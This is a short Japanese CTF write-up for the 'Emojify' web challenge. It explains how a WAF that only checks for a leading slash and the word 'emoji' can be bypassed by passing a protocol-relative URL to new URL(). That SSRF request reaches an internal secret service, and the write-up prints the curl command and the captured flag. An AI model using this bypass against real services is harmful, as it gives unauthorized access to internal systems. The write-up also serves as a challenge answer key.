# Emojify

> `:pizza:` -> 🍕
>
> http://34.170.146.252:31211

[emoji.tar.gz](https://alpacahack-prod.s3.ap-northeast-1.amazonaws.com/5bad030b-a894-4111-900d-43332caf6bf6/emojify.tar.gz)が提供される

Next.jsのアプリケーションが内包されている。

```bash
> cat secret/index.js
import express from "express";

const FLAG = process.env.FLAG ?? "Alpaca{REDACTED}";

express()
  // http://secret:1337/flag
  .get("/flag", (req, res) => res.send(FLAG))
  .listen(1337);
```

コードを見ると
`http://secret:1337/flag`でflagを取得できることが分かる。

フロントエンドの`/api`エンドポイントは`path`クエリパラメータを受け取り、WAFで検証する。
WAFは`path`が`/`で始まり、`emoji`を含むことを要求する。
`new URL(path, "http://backend:3000")`でURLを構築

`new URL()`の挙動を利用し、`path`に`//secret:1337/flag`のようなプロトコル相対URLを渡すと、べーすURLを無視して絶対URLとして扱われれる。
ただ、WAFで`emoji`を含む必要があるので適当に`emoji=1`とか入れる。


`http://34.170.146.252:31211/api?path=//secret:1337/flag?emoji=1`にGETリスエストを送ってみる。

```bash
> curl -X GET http://34.170.146.252:31211/api?path=//secret:1337/flag?emoji=1
Alpaca{Sup3r_Speci4l_Rar3_Flag}
```

flag: `Alpaca{Sup3r_Speci4l_Rar3_Flag}`
